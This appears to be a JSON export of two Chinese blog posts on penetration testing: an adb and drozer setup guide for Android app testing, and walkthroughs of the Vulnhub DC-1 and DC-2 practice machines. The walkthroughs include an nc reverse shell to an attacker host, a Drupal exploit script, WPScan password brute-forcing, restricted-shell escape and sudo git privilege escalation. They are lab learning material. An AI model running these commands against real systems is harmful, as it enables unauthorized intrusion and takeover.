{"name":"penetration test","slug":"penetration-test","count":2,"postlist":[{"title":"搭建 Android 调试环境","slug":"Android-调试","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:46:39.591Z","comments":true,"path":"api/articles/Android-调试.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"搭建-Android-调试环境\"><a href=\"#搭建-Android-调试环境\" class=\"headerlink\" title=\"搭建 Android 调试环境\"></a>搭建 Android 调试环境</h1><h2 id=\"安装adb\"><a href=\"#安装adb\" class=\"headerlink\" title=\"安装adb\"></a>安装adb</h2><p>首先保证 <code>java</code>, <code>javac</code>, <code>java -version</code> 都正常。</p>\n<p>打开 <code>adt-bundle-windows-x86_64-20130219</code> 压缩包，里边已经装好了必需的包。打开 <code>sdk</code>文件夹，将 <code>tools</code> 和 <code>platform-tools</code> 路径配置到系统变量中。</p>\n<p>此时打开 <code>cmd</code> 输入 <code>adb</code> 就能看到 <code>adb options</code> 了。</p>\n<h2 id=\"安装-drozer\"><a href=\"#安装-drozer\" class=\"headerlink\" title=\"安装 drozer\"></a>安装 drozer</h2><p>打开下载的 <code>drozer-install</code> 压缩包，双击里边的  <code>setup.exe</code> 安装，里边还有一个 <code>agent.apk</code> ，这个装到要调试的手机里。</p>\n<p>安装完将 <code>bin</code> 目录添加到环境变量中即可。</p>\n<p><strong>在 <code>drozer</code> 目录中</strong>打开 cmd ，输入 <code>drozer</code> 即可看到 options 选项。</p>\n<h2 id=\"开始调试\"><a href=\"#开始调试\" class=\"headerlink\" title=\"开始调试\"></a>开始调试</h2><p>cmd 输入 <code>adb devices</code> 查看连接的设备</p>\n<p>注：如果找不到设备可以在电脑设备管理器处打开便携设备，查看当前连接的手机的硬件ID，类似于这样： <code>USB\\VID_05C6&amp;PID_9039&amp;MI_00</code> ，然后进入 <code>C:\\Users\\xxx\\.android</code> 目录 <code>adb_usb.ini</code> 文件(没有就新建这个文件),输入 <code>0x05C6</code> </p>\n<p>重新 <code>adb devices</code> 即可看到设备。</p>\n<p>常用命令：</p>\n<p><code>adb shell</code> 即可进入命令交互界面</p>\n<p><code>adb connect ip:port</code> 连接指定设备</p>\n<p>使用 <code>drozer agent</code> 中的 <code>server embedded</code> 将测试设备与 PC 连接起来</p>\n<p>先选择一个合适的端口以便 PC 能连接到 drozer agent 开放的 TCP socket</p>\n<pre><code>adb forward tcp:31415 tcp:31415</code></pre><p>然后在要调试的手机中安装 agent.apk ，安装完后打开监听，默认端口是31415，将手机连到电脑上打开开发者模式调试状态(进入关于手机，版本号处连续点击3次即可进入开发者模式)。</p>\n<p>然后就可以使用 drozer 连接了</p>\n<p>进入 drozer 安装目录命令行输入： <code>drozer console connect</code> 即可进入命令行调试界面</p>\n<p>注：如果这里报错需要检查如下项目</p>\n<p>1、JDK是否安装</p>\n<p>2、环境变量是否正确配置（命令行下执行：java、javac、java -version 命令是否返回正常数据）</p>\n<p>如果以上项目均正常的话可做如下修复：</p>\n<p>建立名为 .drozer_config的文件，文件中添加如下内容：</p>\n<pre><code>[executables]\njava=D:\\Java\\jdk1.7.0_65\\bin\\java.exe\njavac=D:\\Java\\jdk1.7.0_65\\bin\\javac.exe</code></pre><p>即java和javac的路径，保存后存放到C:\\Users\\XXX\\ 目录下，其中XXX为当前用户名目录下，之后重新连接成功</p>\n<h3 id=\"drozer-使用\"><a href=\"#drozer-使用\" class=\"headerlink\" title=\"drozer 使用\"></a>drozer 使用</h3><p><strong>What is drozer?</strong></p>\n<blockquote>\n<p>drozer allows you to assume the role of an Android app and interact with other apps. It can do anything that an installed application can do, such as make use ofAndroid’s Inter-Process Communication (IPC) mechanism and interact with the underlying operating system. </p>\n<p>drozer also helps to you to remotely exploit Android devices, by building malicious files or web pages that exploit known vulnerabilities. The payload that is used in these exploits is a rogue drozer agent that is essentially a remote administration tool. Depending on the permissions granted to the vulnerable app, drozer can install a full agent, inject a limited agent into the process using a novel technique or spawn a reverse shell.</p>\n</blockquote>\n<h4 id=\"找到目标\"><a href=\"#找到目标\" class=\"headerlink\" title=\"找到目标\"></a>找到目标</h4><p>第一步是查找我们要调试的包</p>\n<pre><code>run app.package.list 查看所有安装在手机上应用程序的包名</code></pre><p>查找要测试的包名 xxx</p>\n<pre><code>dz&gt; run app.package.list -f xxx\ncom.example.xxx (xxx)</code></pre><p>我们可以让 drozer 提供一些关于这个包的基本信息，使用 <code>app.package.info</code> </p>\n<pre><code>dz&gt; run app.package.info -a com.mwr.example.sieve \nPackage: com.mwr.example.sieve\nProcess Name: com.mwr.example.sieve\nVersion: 1.0\nData Directory: /data/data/com.mwr.example.sieve\nAPK Path: /data/app/com.mwr.example.sieve-2.apk\nUID: 10056\nGID: [1028, 1015, 3003]\nShared Libraries: null\nShared User ID: null\nUses Permissions:</code></pre><h4 id=\"探测攻击面\"><a href=\"#探测攻击面\" class=\"headerlink\" title=\"探测攻击面\"></a>探测攻击面</h4><p>我们可以让 drozer 报告包的攻击面</p>\n<pre><code>dz&gt; run app.package.attacksurface com.mwr.example.sieve\nAttack Surface:\n    3 activities exported\n    0 broadcast receivers exported\n    2 content providers exported\n    2 services expo\n        is debuggable</code></pre><p>This shows that we have a number of potential vectors. The app ‘exports’ (makes accessible to other apps) a number of activities (screens used by the app), content providers (database objects) and services (background workers).</p>\n<p>We also note that the service is debuggable, which means that we can attach a debugger to the process, using adb, and step through the code.</p>\n<h4 id=\"Launching-Activities\"><a href=\"#Launching-Activities\" class=\"headerlink\" title=\"Launching Activities\"></a>Launching Activities</h4><p>我们可以使用更精确的命令来深入挖掘攻击面</p>\n<pre><code>dz&gt; run app.activity.info -a com.mwr.example.sieve \nPackage:com.mwr.example.sieve\n    com.mwr.example.sieve.FileSelectActivity\n    com.mwr.example.sieve.MainLoginActivit\n    com.mwr.example.sieve.PWLi</code></pre><h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/JDragons/p/5596258.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/JDragons/p/5596258.html</a></p>\n</blockquote>\n","text":"搭建 Android 调试环境安装adb首先保证 java, javac, java -version 都正常。打开 adt-bundle-windows-x86_64-20130219 压缩包，里边已经装好了必需的包。打开 sdk文件夹，将 tools 和 platform-t","link":"","raw":null,"photos":[],"categories":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/categories/penetration-test.json"}],"tags":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/tags/penetration-test.json"},{"name":"Android","slug":"Android","count":1,"path":"api/tags/Android.json"}]},{"title":"Vulnhub","slug":"Vulnhub渗透测试","date":"2020-04-29T05:40:34.000Z","updated":"2020-04-29T05:48:43.165Z","comments":true,"path":"api/articles/Vulnhub渗透测试.json","excerpt":"","keywords":null,"cover":"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczksqx4o2j30yn0dfwhj.jpg","content":"<h1 id=\"DC-1-渗透测试\"><a href=\"#DC-1-渗透测试\" class=\"headerlink\" title=\"DC-1 渗透测试\"></a>DC-1 渗透测试</h1><h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><p>官网下载压缩包后解压出 .ova 文件，然后用 Vmware 打开即可。</p>\n<h2 id=\"能学到什么？\"><a href=\"#能学到什么？\" class=\"headerlink\" title=\"能学到什么？\"></a>能学到什么？</h2><ul>\n<li>arp-scan 进行主机发现</li>\n<li>nmap 扫描主机端口开放和运行的服务情况</li>\n<li>whatweb 指纹识别</li>\n<li>searchsploit 离线漏洞库使用</li>\n<li>nc 反弹shell</li>\n<li>SUID 提权</li>\n</ul>\n<h2 id=\"Let’s-do-it\"><a href=\"#Let’s-do-it\" class=\"headerlink\" title=\"Let’s do it!\"></a>Let’s do it!</h2><p>先扫描一下靶机 IP </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">srp-scan -l</span><br><span class=\"line\">nmap -p- -A 192.168.0.119</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczksqx4o2j30yn0dfwhj.jpg\" alt=\"主机扫描\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczksxvr1ij30ji0h37bw.jpg\" alt=\"端口扫描结果\"></p>\n<p>看到 robots.txt 的一些信息。访问之后暂时没有找到靶机的敏感信息。还是先看一下靶机使用的 CMS 版本，找找有没有可利用的漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">whatweb http://192.168.0.119</span><br><span class=\"line\">searchsploit drupal 7</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkt4dx55j30k50hztj8.jpg\" alt=\"版本探测\"></p>\n<p>看到一个通过注入添加账户，我们就用这个：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python /usr/share/exploitdb/exploits/php/webapps/34992.py -u root -p root -t http://192.168.0.119</span><br></pre></td></tr></table></figure>\n\n<p>登陆成功之后我们顺利拿到了 flag3。<strong>PERMS</strong> ? <strong>FIND</strong>?  先找找 flag1 &amp; flag2 吧。</p>\n<p>看了看后台其他地方，没有看到flag的影子，但是找到了一个module上传的地方。同时在上传上方提供的链接那里找到了一个特殊的 module：shell.我们下载下来并上传。</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkv7iltzj30yh0fwwjq.jpg\" alt=\"flag3\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkvhebatj30nc0fb0tp.jpg\" alt=\"module上传\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkw4vwawj30x40hy77k.jpg\" alt=\"module-shell\"></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwagg0oj30lt08et8w.jpg\" alt=\"上传shell成功\"></p>\n<p>上传成功之后别忘记在配置 Modules 页面勾选 我们刚上传的 shell ，并且保存配置。接下来，在主页就可以使用这个特殊的 shell 。</p>\n<p>我们先试试 <code>find</code> 命令吧。得到 flag1 并提示我们查看配置文件。先 nc 反弹个 shell 吧。 然后在默认的文件路径下找到配置文件，同时获取了 flag2 和数据库账号密码！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkwgbjzxj30qp0dogm5.jpg\" alt=\"使用shell\"></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwl1s70j30i2066ta7.jpg\" alt=\"反弹shell\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkwos8m3j30l00f7n2z.jpg\" alt=\"flag2\"></p>\n<p>现在，我们拿到了数据库账号密码，flag2的提示”爆破和字典攻击不是唯一的获得访问权的方式”，这明显是提醒如何获取flag3的。</p>\n<p>既然我们已经通过其他方式得到了 flag3 ，就先把数据库放一边，再看看flag3 的提示：</p>\n<p><strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong></p>\n<p>这里我再次使用了find 命令想找找有没有其他的发现，结果 flag4 &amp; thefinalflag 都出现了。与上次的区别在于我这次找的是 <code>flag*</code> 。尝试读取最后的 flag 时发现权限不够。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / | grep flag*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczky5tjj3j30jv0con4q.jpg\" alt=\"flag4\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkyb2j3gj30ki0hd0y5.jpg\" alt=\"读取finalflag失败\"></p>\n<p><code>Google</code> 了一下 <code>find perm escalate privileges</code> ,找到一篇<a href=\"https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/\" target=\"_blank\" rel=\"noopener\">大牛文章</a>，按照文章的方法成功提权，并且读取最后一个 flag ！</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkygi4h1j30t10dj40o.jpg\" alt=\"find-suid\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkyn8eu5j30h80dmwht.jpg\" alt=\"root权限执行命令\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkysuue9j30jr07jwgw.jpg\" alt=\"最后一个flag\"></p>\n<h1 id=\"DC-2-渗透测试\"><a href=\"#DC-2-渗透测试\" class=\"headerlink\" title=\"DC-2 渗透测试\"></a>DC-2 渗透测试</h1><h2 id=\"Info-of-DC-2\"><a href=\"#Info-of-DC-2\" class=\"headerlink\" title=\"Info of DC-2\"></a>Info of <a href=\"https://www.vulnhub.com/entry/dc-2,311/#\" target=\"_blank\" rel=\"noopener\">DC-2</a></h2><h3 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h3><blockquote>\n<p>Just like with DC-1, there are five flags including the final flag.</p>\n<p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p>\n<p>In short, the only flag that really counts, is the final flag.</p>\n<p>For beginners, <strong>Google is your friend. Well, apart from all the privacy concerns etc etc.</strong></p>\n<p>Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.</p>\n<p><strong>Please note that you will need to set the hosts file on your pentesting device to something like:</strong></p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.131</span> dc<span class=\"number\">-2</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>Obviously, replace 192.168.0.145 with the actual IP address of DC-2.</p>\n</blockquote>\n<h2 id=\"能学到什么？-1\"><a href=\"#能学到什么？-1\" class=\"headerlink\" title=\"能学到什么？\"></a>能学到什么？</h2><ul>\n<li>如何利用 Nmap 进行主机发现并扫描目标主机端口服务开放情况</li>\n<li>CeWl 是什么？怎么用？</li>\n<li>如何利用 WPscan 枚举 WP站点用户</li>\n<li>如何利用 WPscan 爆破后台账号密码</li>\n<li>vi 提权</li>\n<li>Git 提权</li>\n</ul>\n<h2 id=\"Let’s-do-it-1\"><a href=\"#Let’s-do-it-1\" class=\"headerlink\" title=\"Let’s do it!\"></a>Let’s do it!</h2><p>先使用进行 nmap 进行主机发现</p>\n<p><code>nmap -sn 192.168.0.0/24</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl41xnwvj30j408jgq3.jpg\" alt=\"扫描结果\"></p>\n<p>去浏览器搜索发现 <code>192.168.0.131</code> 正是靶机(上文简介中作者提到如果访问靶机不成功记得修改 hosts 文件，将靶机 IP 添加进去)。</p>\n<p>接下来我们简单扫一下端口，我们扫了1000个端口，可以看到开放80，同时也能发现是 wordpress 的站点。</p>\n<p><code>nmap -A 192.168.0.131</code> </p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl4abh1kj31420iyaqv.jpg\" alt=\"靶机端口信息\"> </p>\n<p>接下来，我们浏览目标站点，发现了 flag 内容</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4fhr7aj30sr0gp7a1.jpg\" alt=\"Flag 内容\"></p>\n<p>这是第一个 flag ！提示我们可能要用到 cewl 来制作一个字典 进行登陆。</p>\n<blockquote>\n<p>Cewl - Custom Word List generator</p>\n<p>Based on a discussion on <a href=\"http://wiki.securityweekly.com/wiki/index.php/Episode129\" target=\"_blank\" rel=\"noopener\">PaulDotCom episode 129</a> about creating custom word lists by spidering a targets website and  collecting unique words I decided to write CeWL, the Custom Word List  generator. CeWL is a ruby app which spiders a given url to a specified  depth, optionally following external links, and returns a list of words  which can then be used for password crackers such as <a href=\"http://www.openwall.com/john/\" target=\"_blank\" rel=\"noopener\">John the Ripper</a>.     </p>\n<p>可以大致了解到 cewl 是通过爬虫的方式对目标网站进行深度爬取，然后返回可能作为密码的词汇</p>\n</blockquote>\n<p>我们来制作一个密码本吧！</p>\n<p><code>cewl -w dc-2pwd.txt http://dc-2</code></p>\n<p>然后使用 wpscan 来枚举一下用户</p>\n<p> <code>wpscan -e u --url 192.168.0.131</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4kx0ogj30v60g4ahu.jpg\" alt=\"用户名\"></p>\n<p>除了 <strong>admin</strong> 外，还有 <strong>jerry</strong> 和 <strong>tom</strong> . 我们把用户名保存在 <strong>dc-2user.txt</strong> 中。</p>\n<p>然后来爆破密码</p>\n<p><code>wpscan -P dc-2pwd.txt -U dc-2user.txt --url http://dc-2</code></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4r2fj2j30vm0akaf5.jpg\" alt=\"爆破密码\"></p>\n<p>得到两组可用的账号密码:</p>\n<p><strong>jerry / adipiscing</strong></p>\n<p><strong>tom / parturient</strong></p>\n<p>我们去后台(<a href=\"http://dc-2/wp-admin)登陆进去看到了Flag2。\" target=\"_blank\" rel=\"noopener\">http://dc-2/wp-admin)登陆进去看到了Flag2。</a></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl54khqaj30su0fwq4r.jpg\" alt=\"后台\"></p>\n<p>其他的入口？我们再对靶机进行一次全端口扫描</p>\n<p><code>nmap -p- -A 192.168.0.131</code></p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl58dlv3j30pq0fmgrb.jpg\" alt=\"端口扫描\"></p>\n<p>尝试登陆一下 ssh ，用 tom 的账号密码登陆上后发现我们得到的是 restricted shell. 同时我们只有四个命令可以使用。分别是</p>\n<p> <code>less 、ls、scp、vi.</code></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl5cpiyfj30ns0cvq6w.jpg\" alt=\"rbash\"></p>\n<p>我们可以在<a href=\"https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/\" target=\"_blank\" rel=\"noopener\">这里</a>找到一些提权总结。里面提到了使用 <code>vi</code> 提权。</p>\n<p><code>vi flag3.txt</code> 查看一下文本内容</p>\n<blockquote>\n<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>\n</blockquote>\n<p>我们需要切换到 jerry 才能继续，我们就利用上文提权总结里的方法利用 <strong>vi</strong> 进行提权：<code>vi</code> 进入交互模式之后直接输入：</p>\n<p><code>!set shell=/bin/sh</code></p>\n<p><code>!shell</code></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1gczl5gjui5j30bo0dj0to.jpg\" alt=\"提权到jerry\"></p>\n<p>虽然提权切换到 jerry 了，但是看起来还是个 restricted shell.</p>\n<p>我们查看环境变量发现不对劲，修改一下环境变量之后我们就可以执行命令了。也在 flag4 中发现提示我们 git 提权。 </p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl5msm3jj30f00h440l.jpg\" alt=\"PATH\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl61u3wzj30jn083dgw.jpg\" alt=\"flag4.txt\"></p>\n<p>还差最后一步！</p>\n<p>还好，我们百度到一篇<a href=\"https://www.agesec.com/4144.html\" target=\"_blank\" rel=\"noopener\">GIt提权文章</a>，查看权限发现可以不用密码就可以以 <strong>root</strong> 身份执行 <strong>git</strong> 命令，同时利用调用命令交互窗口</p>\n<p><code>sudo git help config</code></p>\n<p><code>!/bin/sh</code>   </p>\n<p>即可顺利提权！</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl6aztnwj30hk067got.jpg\" alt=\"nopasswd-git\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl6gqm7vj30i20dyafx.jpg\" alt=\"finally!\"></p>\n<h2 id=\"Little-tips\"><a href=\"#Little-tips\" class=\"headerlink\" title=\"Little tips\"></a>Little tips</h2><p>在使用 WPscan 之前你可能需要升级到最新版本。因为从 2/1/2020 起，WPscan 将放弃维护之前的版本.</p>\n<blockquote>\n<p>We released WPScan 3.7.0 on <a href=\"https://twitter.com/_WPScan_/status/1172432920159539202\" target=\"_blank\" rel=\"noopener\">September 13th 2019</a>, which uses the <a href=\"https://wpvulndb.com/api\" target=\"_blank\" rel=\"noopener\">WPVulnDB API</a> to fetch vulnerability data in real time. On February 1st 2020, we will be deprecating the use of older versions of WPScan, prior to version  3.7.0.</p>\n<p>Anyone using WPScan that is at a version lesser than 3.7.0 will have  to update to at least version 3.7.0, or above, before February 1st 2020.</p>\n</blockquote>\n<p>还有一点需要注意的是升级之后如果想使用他们的漏洞库，必须要到官网进行注册，获得TOKEN。在使用时带上 TOKEN 才能正常使用。</p>\n","text":"DC-1 渗透测试环境准备官网下载压缩包后解压出 .ova 文件，然后用 Vmware 打开即可。能学到什么？arp-scan 进行主机发现nmap 扫描主机端口开放和运行的服务情况whatweb 指纹识别searchsploit 离线漏洞库使用nc 反弹shellSUID 提权","link":"","raw":null,"photos":[],"categories":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/categories/penetration-test.json"}],"tags":[{"name":"penetration test","slug":"penetration-test","count":2,"path":"api/tags/penetration-test.json"}]}]}